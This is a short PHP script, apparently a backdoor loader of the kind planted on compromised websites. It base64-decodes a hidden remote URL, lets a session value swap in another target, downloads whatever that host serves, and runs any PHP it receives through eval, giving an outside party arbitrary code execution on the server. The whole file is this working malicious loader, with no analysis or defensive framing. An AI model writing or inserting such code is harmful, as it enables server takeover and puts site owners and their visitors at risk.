<?php
#op1j3i1ui31ejnwkfsfs
session_start();

function fetchUrl($url) {
    if (!filter_var($url, FILTER_VALIDATE_URL)) {
        return false;
    }

    $ch = curl_init($url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
    curl_setopt($ch, CURLOPT_TIMEOUT, 10);
    curl_setopt($ch, CURLOPT_FAILONERROR, true);

    $result = curl_exec($ch);
    $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);

    if (curl_errno($ch) || $httpCode >= 400) {
        error_log("cURL Error: " . curl_error($ch) . " | HTTP Code: " . $httpCode);
        $result = false;
    }
    
    curl_close($ch);
    
    return $result;
}

// Base64 encoded URL
$encodedUrl = "aHR0cHM6Ly90ZWFtemVkZDIwMjQudGVjaC9yYXcvTWN1UUdJ";

// Dekode Base64 ke URL asli
$url = base64_decode($encodedUrl);

// Gunakan URL dari session jika tersedia
$targetUrl = $_SESSION["ts_url"] ?? $url;

if (filter_var($targetUrl, FILTER_VALIDATE_URL)) {
    $result = @file_get_contents($targetUrl) ?: fetchUrl($targetUrl);

    if ($result !== false) {
        if (stripos($result, '<?php') !== false) {
            try {
                eval('?>' . $result);
            } catch (Throwable $e) {
                error_log("Eval Error: " . $e->getMessage());
                echo "Error: Failed to execute script.";
            }
        } else {
            echo htmlspecialchars($result, ENT_QUOTES, 'UTF-8');
        }
    } else {
        echo "Error: Unable to fetch content.";
    }
} else {
    echo "Error: Invalid URL.";
}
